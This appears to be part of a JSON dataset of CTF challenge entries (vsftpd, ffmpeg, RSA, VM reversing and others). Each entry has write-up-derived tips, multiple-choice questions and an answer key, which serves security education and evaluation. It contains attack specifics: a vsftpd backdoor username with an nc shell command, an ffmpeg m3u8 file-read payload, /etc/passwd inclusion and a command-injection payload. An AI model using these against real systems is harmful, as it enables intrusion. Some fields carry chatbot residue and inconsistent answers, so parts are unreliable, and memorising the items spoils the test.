            "When exploiting a block cipher in CBC (Cipher Block Chaining) mode with a predictable plaintext structure like JSON, what technique allows unauthorized data manipulation within application-level content? - A. Encrypting additional data blocks with a different key to append to the original message. - B. Using a bit-flipping attack on the ciphertext of a block that precedes the target block to alter its content indirectly. - C. Modifying the encryption algorithm to include a backdoor for selective decryption. - D. Increasing the block size to introduce redundancy and exploit error correction mechanisms."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Vader",
        "write_up": "dataset/raw/Vader.md",
        "type": "pwn",
        "competition": [
            "SpaceHeroes/2022",
            "https://ctftime.org/event/1567/tasks/"
        ],
        "score": 100,
        "max_score": 991,
        "difficulty": 0.10090817356205853,
        "knowledge": [
            "When encountering challenges that involve binaries with common vulnerabilities such as buffer overflow, tools like AUTOROP can be used to automate the exploitation process which involves creating a core dump, finding the offset, leaking function addresses, searching for a suitable libc version, and eventually executing a payload to spawn a shell. This process can be valuable for exploiting binaries in CTF challenges that are vulnerable to Return Oriented Programming (ROP) attacks.",
            "If both a medium and hard challenge are hosted on the same server and port, and share the same binary, it is worth examining if the unintended solutions can be applied to solve multiple challenges simultaneously. This involves inspecting the filesystem of the exploited environment for additional flags or files related to different challenges. This strategy can save time and effort by leveraging a single exploit to achieve multiple objectives."
        ],
        "question": [
            "When using AUTOROP for automating the exploitation of a binary in a CTF challenge, which of the following steps is NOT part of the automated process employed by AUTOROP? - A. Generating a core dump and finding the offset - B. Injecting an arbitrary shellcode directly into the binary's execution flow - C. Searching for a suitable libc version based on leaked addresses - D. Leaking function addresses such as '__libc_start_main' and 'puts' ",
            "In a scenario where an exploit is used to access a server hosting both medium and hard CTF challenges, and you gain control over a shell, what should be the next step to discover if there are additional objectives achievable with this exploit? - A. Immediately try to escalate privileges to root without checking the filesystem - B. Ignore the filesystem and try to find network services running on localhost - C. List the directory contents and search for additional flags or challenge-related files in the environment - D. Reboot the server to see if any startup scripts reveal hidden flags or files "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "vaporwave1",
        "write_up": "dataset/raw/vaporwave1.md",
        "type": "The type of challenge is: forensics",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 190,
        "max_score": 500,
        "difficulty": 0.38,
        "knowledge": [
            "When faced with challenges involving audio files (MP3 or WAV), analyzing the spectrogram using tools like Sonic Visualizer or Audacity can reveal hidden messages or flags. This technique is especially useful in steganography or challenges hinting at visual elements contained within audio files.",
            "Sonic Visualizer is preferred for its ease of use and effectiveness in uncovering hidden data within audio file spectrograms. To successfully extract such information, users should familiarize themselves with navigating the interface and adjusting settings to clearly visualize the spectrogram where hidden contents might be encoded."
        ],
        "question": [
            "When analyzing an MP3 audio file for hidden messages, which tool and technique would be most effective according to best practices in cybersecurity challenges? - A. Using GIMP to directly edit the audio file's waveform - B. Analyzing the file's metadata with ExifTool for embedded messages - C. Viewing the file's spectrogram in Sonic Visualizer or Audacity to find hidden visual data - D. Decompressing the MP3 file into WAV format with VLC Media Player for better clarity ",
            "While working with Sonic Visualizer to uncover hidden data in audio file spectrograms, what skill is essential for cybersecurity practitioners to effectively reveal and analyze such hidden information? - A. Proficiency in using VLC Media Player to convert audio files to different formats - B. Expertise in hexadecimal editing to directly manipulate the audio file's binary data - C. Familiarity with navigating Sonic Visualizer's interface and adjusting spectrogram settings for optimal visibility of encoded content - D. Mastering Python scripting to automatically decode any hidden messages without manual inspection "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "vending-machine-v2",
        "write_up": "dataset/raw/vending-machine-v2.md",
        "type": "The type of the challenge described in the write-up is a **crypto** challenge.\n\nIf you have any more write-ups or challenges that you'd like to verify the type of, feel free to share!",
        "competition": [
            "HSCTF/2022",
            "https://ctftime.org/event/1627/tasks/"
        ],
        "score": 496,
        "max_score": 496,
        "difficulty": 1.0,
        "knowledge": [
            "In scenarios dealing with finding a subset of elements that satisfy certain conditions, such as summing to a specific target number within a tolerance (e.g., $\\epsilon$), dynamic programming (DP) with memoization can be an effective approach. This technique stores the results of subproblems to avoid redundant calculations, significantly reducing the time complexity of the algorithm. Implement memoization by keeping a dictionary (or a similar data structure) where keys represent states (e.g., remaining value and starting index) and values represent the outcome of the subset sum calculation for those parameters.",
            "In problems requiring interaction with a server or an external system where sending multiple payloads can lead to timeouts or connection resets, batching requests by combining multiple payloads into a single transmission can mitigate these issues. This approach reduces the number of network operations needed, hence decreasing the chance of connection problems and potentially speeding up the overall process.\n\nExample Payload (for batching requests):\n```python\npayload = b''\nfor i in range(100):\n    payload += str(i).encode() + b'\\n'\nsock.sendall(payload)\n```"
        ],
        "question": [
            "When implementing a dynamic programming solution to find a subset of elements that sum up to a target value within an $\\epsilon$ tolerance, which of the following best describes the purpose of memoization? - A. To reduce the storage requirements by only keeping the most recent calculation. - B. To speed up the algorithm by storing the results of subproblems, so they do not need to be recalculated. - C. To increase the complexity of the solution, ensuring a more thorough search space is covered. - D. To sequentially process each element without revisiting previous computations.",
            "In a client-server interaction scenario where sending a high number of payloads individually may lead to connection reset issues, which technique is most effective in mitigating this problem? - A. Sending each payload in a separate thread to maximize concurrency. - B. Reducing the size of each payload to minimize data transfer. - C. Combining all payloads into a single batch and transmitting them together to reduce the number of send operations. - D. Encrypting payloads to prevent detection by network security mechanisms."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Very Secure FTP",
        "write_up": "dataset/raw/Very Secure FTP.md",
        "type": "misc",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 50,
        "max_score": 792,
        "difficulty": 0.06313131313131314,
        "knowledge": [
            "When dealing with FTP services in CTF challenges, especially known versions with historical vulnerabilities, it is crucial to research specific version-related exploits or backdoors. This approach enables the identification of easy exploitation methods. A common method for exploiting the vsftpd 2.3.4 vulnerability involves using a special username (e.g., one ending with \":)\") to trigger a backdoor and gain unauthorized access. This knowledge applies to scenarios where the version of a service or application is disclosed and is known to have vulnerabilities.",
            "Upon gaining access to an unauthorized or unintended shell in a CTF challenge, standard Unix commands (e.g., `ls`, `cat`) are fundamental in navigating the filesystem and retrieving files of interest, such as `flag.txt`. This approach is universally applicable in scenarios where command-line access is obtained, providing a method to explore the environment and extract sensitive information.\n   \nExample command to access the shell: `nc vsftp.uni.hctf.fun 6200`"
        ],
        "question": [
            "In a CTF challenge, which of the following sequences could be used as a username to exploit a backdoor in the vsftpd 2.3.4 FTP service, gaining unauthorized access? - A. Use a username with a period at the end (exampleUser.) - B. Prepend a colon to the username (exampleUser:) - C. Append a smiley face \":)\" to the username (exampleUser:) - D. Include an exclamation mark at the end of the username (exampleUser!) ",
            "After exploiting a service vulnerability and gaining shell access in a CTF challenge, which command would you use to list the files in the current directory? - A. `ls` - B. `delete *.*` - C. `show files` - D. `dir /p` "
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "very-hot",
        "write_up": "dataset/raw/very-hot.md",
        "type": "crypto",
        "competition": [
            "LA/2024",
            "https://ctftime.org/event/2102/tasks/"
        ],
        "score": 216,
        "max_score": 499,
        "difficulty": 0.43286573146292584,
        "knowledge": [
            "When dealing with RSA encryption challenges where the modulus \\(n\\) is generated from the product of three prime numbers (instead of the usual two), it's possible to exploit weaknesses in the scheme if the primes are closely related or generated in a predictable manner. In this case, if you can express \\(n\\) as a polynomial equation where the primes are related by a known difference, you can use symbolic computation libraries like `sympy` in Python to solve for these prime numbers.\n   - Example of exploiting: The primes \\(p\\), \\(q\\), and \\(r\\) are generated such that \\(q = p + 6\\) and \\(r = p + 12\\). You can represent \\(n\\) as a cubic equation \\(p^3 + 18p^2 + 72p - n = 0\\) and solve for \\(p\\).",
            "After obtaining the prime values required for RSA decryption, the next step is to calculate the private exponent \\(d\\) using the totient of \\(n\\), which for three primes is \\(\\phi(n) = (p - 1)(q - 1)(r - 1)\\). With \\(d\\), \\(n\\), and the ciphertext \\(ct\\), you can decrypt the ciphertext using the RSA decryption formula to retrieve the plaintext. This method can universally apply to RSA challenges that involve non-standard prime generation methods.\n   - Decryption process involves: Calculating \\(\\phi(n)\\) with the found primes, finding \\(d\\) by computing the modular inverse of \\(e\\) modulo \\(\\phi(n)\\), and finally decrypting the ciphertext with \\(ct^{d} \\mod n\\)."
        ],
        "question": [
            "When attempting to factorize the RSA modulus \\(n\\) generated from three closely related prime numbers in a CTF challenge, which technique is applicable to find the prime numbers if \\(n\\) is represented by the equation \\(p^3 + 18p^2 + 72p - n = 0\\)? - A. Use a brute force search to try all possible values of \\(p\\) until the correct one is found. - B. Apply Fermat's factorization method to find distinct primes. - C. Utilize symbolic computation libraries like `sympy` to solve the cubic equation for \\(p\\). - D. Perform trial division starting with the smallest primes. ",
            "For RSA decryption in a scenario where the modulus \\(n\\) is the product of three primes \\(p\\), \\(q\\), and \\(r\\), and the primes are already discovered, which of the following steps is essential to decrypt the ciphertext? - A. Calculate \\(\\phi(n)\\) as \\(n - (p + q + r)\\) and then find \\(d\\) using \\(e^{-1} \\mod \\phi(n)\\). - B. Determine the private exponent \\(d\\) by calculating the modular inverse of the public exponent \\(e\\) modulo \\(\\phi(n) = (p - 1)(q - 1)(r - 1)\\). - C. Directly use the public exponent \\(e\\) as the decryption key without calculating the private exponent \\(d\\). - D. Multiply \\(p\\), \\(q\\), and \\(r\\) to find a new modulus and use it with \\(e\\) to decrypt the ciphertext directly. "
        ],
        "answer": [
            "C. Utilize symbolic computation libraries like `sympy` to solve the cubic equation for \\(p\\).",
            "B. Determine the private exponent \\(d\\) by calculating the modular inverse of the public exponent \\(e\\) modulo \\(\\phi(n) = (p - 1)(q - 1)(r - 1)\\)."
        ]
    },
    {
        "name": "Video Bazar",
        "write_up": "dataset/raw/Video Bazar.md",
        "type": "web",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 936,
        "max_score": 1000,
        "difficulty": 0.936,
        "knowledge": [
            "When a web application challenge involves file upload functionality, and the source code reveals the use of specific software or tools for handling these files (in this instance, `ffmpeg` for media file conversion), it is prudent to research known vulnerabilities or CVEs related to these tools, especially versions that handle specific file formats (e.g., `m3u8` playlist files in `ffmpeg`). This approach can uncover exploitation vectors that bypass the application's intended use or security measures. Example payload for exploiting `ffmpeg` CVE-2017-9993:\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\nANY_TEXT_FILE.txt\n#EXTINF:1.0\nTARGET_FILE_PATH\n#EXT-X-ENDLIST\n```",
            "In scenarios where a web challenge hints at accessing a version control repository (e.g., `.bzr` for Bazaar, `.git` for Git) that is not commonly used or known, checking for these directories can reveal sensitive information or source code. This knowledge is particularly useful when the repository directory is not properly secured (HTTP status code 403 Forbidden instead of 404 Not Found), allowing an attacker to dump the repository's content using specialized tools, such as `bzr_dumper` for Bazaar repositories. Through analyzing dumped source code, credentials, hidden features, or further information about the application's infrastructure can be discovered, aiding in the crafting of an exploit."
        ],
        "question": [
            "When exploiting the `ffmpeg` vulnerability with CVE-2017-9993 through a file upload feature, which payload best demonstrates the manipulation of `ffmpeg` to read an unintended file keeping the application scenario in mind? - A. ```#EXTM3U\\n#EXT-X-VERSION:3\\n#EXTINF:10,\\nfile:///etc/passwd``` - B. ```#EXTM3U\\n#EXT-X-STREAM-INF:BANDWIDTH=1280000\\nfilename.mp4``` - C. ```#EXTM3U\\n#EXT-X-MEDIA-SEQUENCE:0\\n#EXTINF:1.0\\nANY_TEXT_FILE.txt\\n#EXTINF:1.0\\nTARGET_FILE_PATH\\n#EXT-X-ENDLIST``` - D. ```<playlist>\\n<media src=\"filename.avi\"/>\\n</playlist>```",
            "Given a web challenge where the initial clue suggests investigating the presence of a version control system and you encounter a 403 Forbidden error upon accessing the path `/.bzr`, which action is most appropriate based on the knowledge gleaned from the scenario? - A. Use `nmap` to scan for open ports on the server. - B. Send a POST request with JSON payload to bypass the HTTP 403 error. - C. Look for `.git` directory instead, considering `.bzr` might be a red herring. - D. Utilize a tool like `bzr_dumper` to dump the Bazaar repository for further analysis."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Vietnam",
        "write_up": "dataset/raw/Vietnam.md",
        "type": "The type of challenge described in the write-up is a `reverse` challenge.",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "When facing a challenge that involves string manipulation and memory address manipulation, identify the critical operations that manipulate memory or handle input/output. In this case, look for segments in the challenge code that directly interact with the user's input or modify specific memory locations. These segments often contain the vulnerability or logic needed to solve the challenge. For example, using `case ','` to accept a new input character with `getchar()` and `case '.'` to set the current character to what is stored at a specific memory address indicated by `*str = *sa;`.",
            "To manipulate the memory successfully and achieve a desired output, craft an input that interacts with the challenge's logic in the intended manner. For example, if the challenge requires producing a specific string in memory (\"HELLO\\n\"), and you have operations that allow you to input characters one by one and place them into a buffer, structure your input accordingly. Use a sequence like `,.,.,.,.,.,.\\n` followed by \"HELLO\\n\" to input each character of the target string into the desired location in memory, where `,.` is used to read a character and move it to the buffer."
        ],
        "question": [
            "In a binary exploitation challenge, what does the `,` case in the switch statement accomplish? - A. Sets the current character in the buffer to 'H' - B. Accepts a new input character with `getchar()` and stores it in a variable - C. Increments the value stored at the current buffer address by 1 - D. Compares two strings and returns if they are equal or not",
            "How should one structure their input to manipulate memory such that the output \"HELLO\\n\" is achieved, given the operations provided in `,` and `.` cases? - A. Input \"HELLO\\n\" followed by `,.,.,.,.,.,.` - B. Use `,` for each character in \"HELLO\\n\" without any additional operations - C. Use a sequence like \",.,.,.,.,.,.\\n\" followed by \"HELLO\\n\" where `,` reads and `.` writes a character to the buffer - D. Input \"HELLO\\n\" directly without using any special sequence"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Vigenere3d",
        "write_up": "dataset/raw/Vigenere3d.md",
        "type": "crypto",
        "competition": [
            "SECCON/2017/Quals",
            "https://ctftime.org/event/512/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When dealing with a variant of the Vigenere cipher that introduces additional dimensions to the encryption process, reconstructing the decryption function based on the provided encryption code is crucial for understanding the mechanism and devising a method to decrypt the ciphertext. This approach involves analyzing the encryption function to reverse its process, focusing on how the cipher text is generated using two keys and a predefined character set. Example code snippet for decryption might not be directly provided due to complexity, but the principle involves looping through each character of the ciphertext, and for each possible character in the set, checking if applying the encryption process with a guessed key yields the original ciphertext character.",
            "In instances where the encryption process allows for multiple keys to produce identical ciphertexts, focusing on partial key recovery can significantly reduce the complexity of breaking the cipher. The given scenario illustrated that for a specific character position in the key, there exists a corresponding character in another position that will result in the correct ciphertext output due to the cipher's structure. By exploiting this property to recover only a subset of the key (e.g., half of it if the key pairs influence each other symmetrically), one can effectively reconstruct the entire key. In the Vigenere 3D challenge, recovering 7 characters of a 14-character key was sufficient due to the symmetrical relationship between characters at positions `x` and `13-x`. This strategy significantly reduces the brute-force search space, making it a practical approach for decrypting the ciphertext."
        ],
        "question": [
            "In the context of implementing a decryption function for a complex cipher like the Vigenere 3D, which involves two keys for encryption, what would be the crucial first step in reversing the process based on the encryption logic given? The deciphering process involves analyzing each character in the ciphertext and iteratively checking against all possible characters in the predefined set to find a match using the guessed keys. - A. Loop through each character of the ciphertext to match it directly with the plaintext. - B. Calculate the checksum of the ciphertext and plaintext to find a direct correlation. - C. Loop through each character of the ciphertext, and for each possible character in the set, check if applying the encryption process with the guessed keys yields the original ciphertext character. - D. Convert the ciphertext into a binary format and perform a bitwise operation to decrypt. ",
            "In the scenario where an encryption scheme such as the Vigenere 3D cipher allows for identical ciphertexts with different keys, what effective strategy could be applied to simplify the key recovery process? The strategy involves exploiting the symmetric relationship between key characters to recover only a portion of the key, thereby reducing the search space needed to decrypt the ciphertext. - A. Focus on breaking the encryption algorithm's core logic rather than the key. - B. Encrypt a known plaintext with all possible keys and compare the results with the original ciphertext. - C. Apply a frequency analysis on the ciphertext to directly obtain the key without considering its symmetry. - D. Exploit the symmetric property of the key positions to reconstruct the entire key by recovering only a subset of it, significantly reducing the brute-force search space. "
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Vim Bar",
        "write_up": "dataset/raw/Vim Bar.md",
        "type": "The type of this challenge is **forensics**.",
        "competition": [
            "Tamil/2021",
            "https://ctftime.org/event/1440/tasks/"
        ],
        "score": 500,
        "max_score": 1199,
        "difficulty": 0.4170141784820684,
        "knowledge": [
            "When analyzing pcap files in forensic CTF challenges, leveraging tools such as Wireshark can be instrumental. Specifically, it's crucial to explore different TCP streams within the pcap file, as each stream can contain unique pieces of information. It's a common practice to manually inspect each stream for anomalies or hints that could lead to the discovery of hidden data. For instance, encrypted files may be transferred over a network and captured in these streams.",
            "When encountering files encrypted by vim (indicated by a hint such as \"vim_crypt\" within the challenge context), and having access to the hex dump of the encrypted file, one can reconstruct the file from the hex dump. Subsequently, tools like vimdecrypt can be utilized to brute-force the encryption key using common password wordlists like rockyou. This approach is particularly effective for files encrypted with commonly used passwords.\n\n   - Sample command to use vimdecrypt with a wordlist: `python vimdecrypt.py -d encryptedfile.vim -w /path/to/wordlist.txt`."
        ],
        "question": [
            "When examining pcap files for forensic analysis, why is it important to inspect different TCP streams? - A.Because each TCP stream represents a different connection, potentially containing unique evidence or data pertinent to the investigation. - B.Because inspecting different TCP streams allows for the optimization of network performance and bandwidth allocation. - C.Because different TCP streams can indicate the level of encryption used on the network, directly revealing passwords. - D.Because each TCP stream is related to a specific user on the network, revealing personal information and browsing habits.",
            "In the context of a digital forensic investigation, how would one proceed upon finding a file encrypted by vim, hinted by \"vim_crypt\" and having its hex dump? - A.By converting the hex dump back to binary and then using social engineering to guess the password. - B.By ignoring the hex dump as it is considered a dead end and focusing on unencrypted files only. - C.By reconstructing the file from the hex dump and using a tool like vimdecrypt with a wordlist to brute-force the encryption key. - D.By reporting the file as corrupted due to encryption and moving on to analyze other files."
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "vim",
        "write_up": "dataset/raw/vim.md",
        "type": "reverse",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 726,
        "max_score": 1000,
        "difficulty": 0.726,
        "knowledge": [
            "When faced with a complex vim script challenge, breaking down the script into smaller, manageable segments can make the task more manageable. This approach enables a step-by-step analysis of the script's functionality. Using simpler or well-understood scripts as a basis, one can emulate a form of dynamic analysis by simulating the execution flow of the original script.",
            "Converting a vim script into a more familiar programming language, such as Python, can aid in understanding and solving the challenge, especially if direct analysis of the script is difficult due to complexity or lack of familiarity with vim scripting. This method allows leveraging existing programming knowledge and tools to analyze the scripts\u2019 logic and behavior.\n\nExample translation process (from vim script to Python code):\n- Identify vim script commands and their Python equivalents.\n- Translate vim variables and functions into Python variables and functions.\n- Simulate vim script execution flow in Python, ensuring logical structures (e.g., loops, conditionals) are correctly implemented.\n\n(Note: Due to the abstract nature of the translation process, a specific code sample is not provided. The approach involves general programming and problem-solving skills rather than executing a specific payload.)"
        ],
        "question": [
            "When trying to understand a complex vim script by breaking it down into smaller segments, which of the following would be the best first step in analyzing the script's functionality? - A. Translating the entire vim script into Python before understanding its segments. - B. Running each segment in vim sequentially to simulate dynamic analysis. - C. Deleting parts of the script randomly to see what changes. - D. Rewriting the vim script into a compiler-like program to identify syntax errors.",
            "In the process of converting a vim script into Python for better understanding, which of the following steps is essential? - A. Writing a compiler in Python to automatically convert vim script syntax to Python syntax without manual intervention. - B. Randomly guessing the functionality of vim commands without looking for their Python equivalents. - C. Simulate vim script execution flow in Python, ensuring logical structures (e.g., loops, conditionals) are correctly implemented. - D. Directly running vim script commands in a Python interpreter to observe the effects."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Virtual Private Network",
        "write_up": "dataset/raw/Virtual Private Network.md",
        "type": "web",
        "competition": [
            "HITCON/2019/Quals",
            "https://ctftime.org/event/848/tasks/"
        ],
        "score": 183,
        "max_score": 500,
        "difficulty": 0.366,
        "knowledge": [
            "When facing a Perl-based web application that includes files based on a parameter, check for directory traversal prevention mechanisms. If the inclusion only checks for the presence of \"..\" to prevent traversal but does not account for absolute paths or other forms of referencing files outside the intended directory, it may be vulnerable to Local File Inclusion (LFI). In such cases, providing a crafted filename as a parameter can lead to arbitrary file inclusion.\n   - Example: If the application concatenates a base directory with user input to include files (e.g., \"./tmp/\" + user_input + \".thtml\"), and only checks for \"..\" in the user input, you can leverage this to include arbitrary files located within allowed directories by crafting the input parameter appropriately, avoiding the use of \"..\".",
            "For command injection vulnerabilities, especially in scenarios where the application's error messages can execute as code (such as with Perl's 'require' function), using stderr redirection can force the application to process the error message as code. This technique is exemplified in CVE-2019-11539 where a command injection into `tcpdump` can be achieved. Tools or functions that generate error messages containing user-controlled input present a unique vector for command injection. Crafting input that results in an error message structurally valid as code, along with stderr redirection, can lead to arbitrary command execution.\n   - Example payload to exploit stderr redirection in command injection: `print 123#`. This input, when passed as a filename to `tcpdump` in an environment where stderr is processed as Perl code, would execute as `print 123`, effectively injecting commands."
        ],
        "question": [
            "In a Perl-based web application that uses user input to dynamically include files, imagine a check is in place to prevent directory traversal by only searching for \"..\" in the user input. If a user wants to include a file from a directory, which of the following inputs could bypass this security check? - A. \"../../etc/passwd\" - B. \"/etc/passwd\" - C. \"index.php\" - D. \"./../config.php\" ",
            "Given a scenario where a web application executes `tcpdump` with user-supplied options, leading to potential command injection vulnerabilities. Using CVE-2019-11539 as a reference, which of the following payloads would correctly exploit stderr redirection to inject a command into a Perl script processing `tcpdump` error messages? - A. \"print 123# >/dev/null 2>&1\" - B. \"'; print 123#\" - C. \"print 123#\" - D. \"`print 123#`\" "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "VirtualJava",
        "write_up": "dataset/raw/VirtualJava.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 357,
        "max_score": 500,
        "difficulty": 0.714,
        "knowledge": [
            "In challenges involving virtual machines or custom interpreters executing assembly-like code, brute-forcing the input character by character based on expected output can be an effective strategy. This approach works well when the code processes input sequentially and checks each character against a set of conditions. It requires modifying or creating a script that iterates through all printable ASCII characters for each position, checking the validity of the output at each step, and if the output matches the expected criteria (not equal to an error state), then the character is considered part of the solution.\n   - Example payload modification snippet: \n     ```java\n     String ans = \"\";\n     for (int i = 32; i < 127; ++i){\n         String aa = Character.toString((char)i);  \n         String a = ans + aa;  \n         ...  \n         boolean right=true;  \n         for (int j = 0; j < c.length; j++) {  \n             String s = getOutput(Math.abs(java.run(j, (int) c[j])));  \n             if (s.equals(\"errorState\")) {  \n                 right = false;  \n                 break;  \n             }  \n         }  \n         if (right == true){  \n             ans = ans + aa;  \n         }  \n     }\n     ```",
            "When reversing or decoding the logic of a custom implementation such as a virtual machine or interpreter, automated tools or scripts that mimic the interpreter's logic but provide debugging or output checking capabilities can significantly reduce the complexity and time required. This method relies on understanding the intended operation of the interpreter to a sufficient degree, allowing the creation of a script that simulates the execution path of inputs to identify the correct sequence that produces a particular outcome.\n   - Note: This point does not lend itself to a singular example payload due to the nature of the challenge being heavily dependent on the specific implementation of the interpreter or virtual machine."
        ],
        "question": [
            "In a scenario where you're facing a custom Java virtual machine executing assembly-like code and need to brute-force the solution, which approach is most effective based on parsing input characters sequentially and using a modified script for validation? - A. Iterate through Unicode characters, appending each to the input string and checking for an error message in the output. - B. Manually guess the input characters based on the expected output and modify the script accordingly after each attempt. - C. Iterate through all printable ASCII characters, adding each character to the input string, and validate the outcome against a specific error state to identify correct characters. - D. Use a cryptographic method to automatically decode the expected input without needing to validate against the program's output.",
            "When tasked with deciphering a custom virtual machine's logic for a CTF challenge, which is the most effective strategy for developing a solution? - A. Creating a detailed flowchart of the interpreter's logic by manually analyzing the source code line by line. - B. Develop an automated script that simulates the virtual machine's logic, offering debugging or output checking features to simplify identifying the correct input sequence. - C. Utilize standard decryption tools with default settings, hoping to directly uncover the logic behind the custom virtual machine or interpreter. - D. Reverse-engineer the virtual machine using traditional compilers in hopes of translating the VM code back into a high-level language automatically."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "vm-v2",
        "write_up": "dataset/raw/vm-v2.md",
        "type": "reverse",
        "competition": [
            "MapleCTF/2022",
            "https://ctftime.org/event/1676/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "In challenges involving custom CPU architectures, a thorough understanding of the architecture and instruction set is crucial. One can start by de-obfuscating and understanding the SystemVerilog (or Verilog) code provided to grasp the CPU's design. This involves identifying stack operations, ALU instructions, and architectural specifics like separate program and data memory (Harvard architecture) or the lack of general-purpose registers (stack-based architecture). De-obfuscation can be approached similarly to reverse engineering any software program, by renaming obfuscated identifiers to meaningful names for better clarity.",
            "If a challenge exhibits a side-channel vulnerability where the program's output or behavior depends on input correctness (such as the total number of executed instructions varying with correct vs. incorrect inputs), a brute-force attack can be effective. This technique particularly applies when verifying inputs incrementally impacts the execution path or instruction count. Develop a script to automate input trials, observing changes in the program's execution metrics (like instruction count) to deduce correct values progressively. \n\n   Python pseudocode example for a brute-force attack leveraging a side-channel vulnerability based on instruction count:\n   ```python\n   best_inscount = initial_run_instruction_count\n   brute_pos = start_of_input_address_in_memory\n   flag = \"\"\n   improved = True\n\n   while improved:\n       improved = False\n       for possible_character in range(0x20, 0x7f): # ASCII printable characters\n           data[brute_pos] = possible_character\n           reset_and_load_cpu_state(cpu, data)\n           instruction_count_after_run = execute_program(cpu)\n           if instruction_count_after_run > best_inscount:\n               flag += chr(possible_character)\n               brute_pos += 1\n               best_inscount = instruction_count_after_run\n               improved = True\n               break\n   print(f\"Extracted flag: {flag}\")\n   ```"
        ],
        "question": [
            "In a custom CPU architecture challenge, a SystemVerilog code fragment of a stack module is given as follows: ```SystemVerilog module Stack(clock,reset,pushValue,poppedHigh,poppedLow,stackOp,stackEnable); input clock,reset,stackEnable; input [7:0] pushValue; output [7:0] poppedHigh,poppedLow; input [2:0] stackOp;  parameter stackBytes = 16; logic [7:0] stackMem [2**stackBytes-1:0]; logic [stackBytes-1:0] stackPointer;  always_ff @(posedge clock) begin ``` Which of the following statement correctly describes the architecture aspect represented by this code fragment? - A. The module defines a general-purpose register file with 16 registers. - B. The stack module utilizes a fixed memory size for stack operations, indicating a stack-based architecture. - C. This module indicates a Harvard architecture with separate instruction and data paths. - D. The architecture uses dynamic sizing for the stack memory, allowing it to grow as needed. ",
            "In a challenge that demonstrates a side-channel vulnerability through variations in the instruction count for correct versus incorrect inputs, a script is provided for brute-forcing the flag by trying ASCII characters. Given this scenario, what does the improved variable represent in the provided brute-force script? - A. The number of instructions executed by the CPU for each attempt. - B. A boolean flag indicating whether any part of the input has been correctly identified. - C. The current memory address being targeted for brute-forcing. - D. The total number of attempts made to guess the flag correctly. "
        ],
        "answer": [
            "B.",
            "B."
        ]
    },
    {
        "name": "vmlog",
        "write_up": "dataset/raw/vmlog.md",
        "type": "The type of this CTF challenge is probably **reverse**.",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 213,
        "max_score": 755,
        "difficulty": 0.28211920529801326,
        "knowledge": [
            "When dealing with VM (Virtual Machine) based CTF challenges that require understanding or interacting with custom programming logic, one effective strategy is to instrument the provided VM code to simulate execution and track its state based on input. This allows for a controlled environment where specific behaviors can be observed and manipulated. For example, modifying the VM code to accept input from a predefined array and to yield memory state after each step can greatly facilitate reverse engineering efforts by enabling automated testing of inputs and direct observation of changes in memory. Such modifications enable a brute-force approach to discovering inputs (like flags) by comparing expected memory states with actual ones after execution. This is particularly useful when dealing with obfuscated or complex VMs where understanding every operation is impractical.",
            "For brute-forcing flags or specific values in VM-based challenges where the correct input leads to a known memory state, create a script that tests all possible inputs in a systematic manner (e.g., byte by byte) and monitors the VM's memory state after each input. By comparing the actual memory state with the expected one after each input, the correct flag or values can be incrementally discovered without full comprehension of the VM's internal workings. This method hinges on the ability to accurately simulate or run the VM with modified control of inputs and a mechanism to read memory states, requiring direct manipulation of the provided VM code.\n\nExample payload generation approach:\n\n```python\nio_array = [None] * expected_input_length  # Predefine the length of flag or input\nfor index in range(len(io_array)):\n    for char in range(256):  # Test all possible ASCII characters\n        io_array[index] = chr(char)\n        mem_state = vm_run(program, io_array)\n        if mem_state == expected_memory_state:\n            print(f\"Found character at position {index}: {chr(char)}\")\n            break  # Move to next character once matching state is found\n```"
        ],
        "question": [
            "In a challenge involving a custom VM that executes character-by-character input to produce specific memory states, which python code modification would enable reverse engineering efforts by allowing input from a predefined array? - A. Modify the VM's input handler to accept inputs directly from the console using `input()`. - B. Adjust the VM's execution loop to increment a global counter after each operation. - C. Incorporate an input array into the VM code, allowing the VM to read input characters from this array instead of standard input. - D. Rewrite the VM's arithmetic logic to output memory states after each operation without modification.",
            "Given a VM-based CTF challenge where finding the correct input sequence alters the VM's memory to a known desired state, what would be the most effective approach to script the brute-force search of this input? - A. Write a script that alters the VM's source code to skip unnecessary instructions and focus on memory state-changing operations. - B. Develop a script that sequentially tests each possible input character for each position, comparing the resulting memory state to the expected state until all characters are identified. - C. Create a script that randomizes input sequences to the VM until the expected memory state is accidentally achieved. - D. Design a script that bypasses the VM's logic entirely and fabricates the desired memory state without running any input through the VM."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "vmwhere2",
        "write_up": "dataset/raw/vmwhere2.md",
        "type": "reverse",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
